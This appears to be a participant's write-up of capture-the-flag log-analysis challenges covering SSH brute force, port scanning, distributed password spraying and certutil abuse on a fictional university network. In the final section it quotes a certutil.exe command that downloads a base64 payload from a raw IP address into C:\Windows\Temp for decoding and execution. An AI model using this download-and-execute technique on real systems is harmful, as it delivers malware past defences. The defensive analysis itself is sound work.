- ## First Watch
    
    You've just taken the overnight shift. Here's the auth log for the last 24 hours at Odapeeka State. One account logged in from somewhere it never has before. Find the username.
    
    Flag format: `C6S{username}`.
    
    - In the log we can see the repeated failed SSH login attempts from an external IP 203.0.113.77 supposedly using jchen username, followed by a successful login. The login intervals suggests some kind of automated password-guessing/brute-force activity.
    - Just for confirmation we see jchen's normal internal login from 10.20.30.34  
        
- ## Patient Zero
    
    Same night, wider view. The anomalous login wasn't the beginning. Work backwards. What did the attacker do *first* - before they ever had a valid credential? Name the technique.
    
    Flag format: `C6S{technique_name}`.
    
    - Log shows SYN requests trying to connect to different ports on a single endpoint, with each port getting hit 1 second apart, suggesting automated port scanning activity.  
        
- ## Needle, Haystack
    
    Thousands of failed logins against Odapeeka State's VPN gateway over six hours. Rotating source addresses, one or two guesses per account - somebody built this to stay under any per-account lockout threshold.
    
    Then one combination worked.
    
    Which account, and which address let them in?
    
    Flag format: `C6S{username_source_ip_with_underscores}`.
    
    - The log is typical Linux auth.log SSH authentication log format.
    - When login is successful, the log message typically includes the keyword "Accepted". I just did a keyword search (Ctrl + F) to find the answer.  
    - Bigger picture, the log shows high volume of automated SSH password attempts against many usernames from many IP's in the 198.51.100.X range consistent with distributed brute-force/password-guessing attack. By distributing password-guessing attempts across multiple source IP addresses, the attacker may evade both IP-based detection and account lockout thresholds, making the attack harder to detect and block.

- ## Living Off The Land
    
    Nothing malicious ran on this box. Every binary in this execution log ships with the operating system, signed, built-in, boring.
    
    Something bad still happened. One of these ordinary tools got used for a job it was never meant for - twice, back to back - and then whatever it produced got run.
    
    Which binary was abused?
    
    Flag format: `C6S{binary_name_lowercase}` (include the extension, dot -> underscore).
    
    - Did a visual inspection of the log and one line jumped out that had an IP address: `certutil.exe -urlcache -split -f http://203.0.113.90/svc_update.b64 C:\Windows\Temp\svc_update.b64`. I know it's suspicious but unfamiliar with what it was doing so i asked ChatGPT:
        - **`certutil.exe`** is a legitimate Windows utility, but it can be abused as a **LOLBIN** (Living-off-the-Land Binary).
        - `-urlcache -split -f` causes it to retrieve a file from a remote URL.
        - It's downloading from a **raw IP address** rather than an expected vendor/domain.
        - The file is placed in **`C:\Windows\Temp`**, a location commonly used for temporary payloads.
        - The filename **`svc_update.b64`** suggests Base64-encoded content.
    - The download was immediately followed by the decode operation, satisfying the "back-to-back" description. The resulting `svc_update.exe` was then executed shortly afterward.  
        
